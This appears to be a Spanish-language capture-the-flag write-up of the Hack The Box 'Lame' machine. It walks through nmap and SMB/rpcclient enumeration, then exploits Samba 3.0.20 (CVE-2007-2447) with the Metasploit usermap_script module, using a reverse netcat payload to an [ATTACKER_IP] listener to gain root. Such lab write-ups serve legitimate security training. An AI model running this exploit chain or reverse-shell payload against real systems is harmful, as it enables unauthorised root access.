---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - Samba
  - MSF
  - RCE
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Enumeración del sistema|Enumeración del sistema]]
	- [[#Enumeración#Enumeración de puertos|Enumeración de puertos]]
	- [[#Enumeración#FTP|FTP]]
	- [[#Enumeración#Samba|Samba]]
		- [[#Samba#Searchsploit|Searchsploit]]
- [[#Explotación|Explotación]]
	- [[#Explotación#RCE|RCE]]

---
# Lame

![](Screenshots/Pasted%20image%2020260428095527.png)

>Máquina de Hack The Box llamada **[Lame](https://app.hackthebox.com/machines/Lame)**, que simula un sistema Linux con varios servicios expuestos como **FTP**, **SSH**, **Samba** y **distccd**.  
>La explotación comienza con la enumeración de servicios, identificando una versión vulnerable de **Samba (3.0.20)**.  
>Se explota una vulnerabilidad conocida (**CVE-2007-2447**) en Samba.  
>Mediante este exploit se consigue ejecución remota de comandos (**RCE**) a través de la funcionalidad `username map script`.  
>Finalmente, se obtiene acceso directo como `root`, comprometiendo completamente el sistema.

---
## Enumeración
### Enumeración del sistema

```PowerShell
ping -c 1 10.129.27.142
PING 10.129.27.142 (10.129.27.142) 56(84) bytes of data.
64 bytes from 10.129.27.142: icmp_seq=1 ttl=63 time=46.4 ms

--- 10.129.27.142 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 46.379/46.379/46.379/0.000 ms
```

El `TTL=63` indica que probablemente estamos ante un sistema Linux.
### Enumeración de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.129.27.142 -oG allPort
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63
```

```PowerShell
nmap -p21,22,139,445,3632 -sCV 10.129.27.142 -oN targeted
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.117
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m36s, deviation: 2h49m45s, median: 33s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-04-28T03:14:18-04:00
```

Puertos descubiertos:
- `21 → FTP`  
- `22 → SSH`  
- `139 → NetBIOS`  
- `445 → SMB`  
- `3632 → distccd`
### FTP

Se prueba acceso anónimo al servicio FTP. Aunque el acceso es exitoso, no se encuentran archivos relevantes para la explotación.
### Samba

```PowerShell
crackmapexec smb 10.129.27.142
SMB         10.129.27.142   445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
```

Se prueba a enumerar directorios con `Null Session`, `anonymous`. Pero no se consigue listar nada.

Se listan usuarios, grupos... con `Null Session`.

```PowerShell
rpcclient $> querydominfo
Domain:         WORKGROUP
Server:         LAME
Comment:        lame server (Samba 3.0.20-Debian)
Total Users:    35
Total Groups:   0
Total Aliases:  0
Sequence No:    1777361185
Force Logoff:   18446744073709551615
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

rpcclient $> enumdomusers
user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

rpcclient $> querydispinfo
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)
```

Se identifican usuarios interesantes como `root` y `msfadmin`, lo que indica un entorno posiblemente vulnerable o mal configurado.

Se procesan los resultados para obtener listas limpias:

```PowerShell
cat users | awk '{print $1}' | tr ':' ' ' | awk '{print $2}' | tr '[]' ' ' | sed 's/^ *//' | sponge users
```

Se observa el comentario de la versión `Samba 3.0.20-Debian`.
#### Searchsploit

Se realiza una búsqueda de vulnerabilidades.

```PowerShell
searchsploit "Samba 3.0.20"
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                                                                    | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                                                          | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                     | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                             | linux_x86/dos/36741.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Se observa el exploit `Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)`.

---
## Explotación
### RCE

La vulnerabilidad `CVE-2007-2447` permite inyectar comandos a través del campo de usuario debido a una mala sanitización en la función `username map script`.  
  
Esto provoca que los comandos se ejecuten en el sistema con privilegios elevados.

```PowerShell
msfconsole -f
msf > search Samba 3.0.20
Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

msf > use 0 | use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > set RHOSTS 10.129.27.142
msf exploit(multi/samba/usermap_script) > set LHOST [ATTACKER_IP]
msf exploit(multi/samba/usermap_script) > show options
Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.129.27.142    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  [ATTACKER_IP]     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf exploit(multi/samba/usermap_script) > exploit
```

Se obtiene una consola interactiva con `root`.

La flag de `usuario` se encuentra en: `/home/makis`.

La flag de `root` se encuentra en `/root`.

---

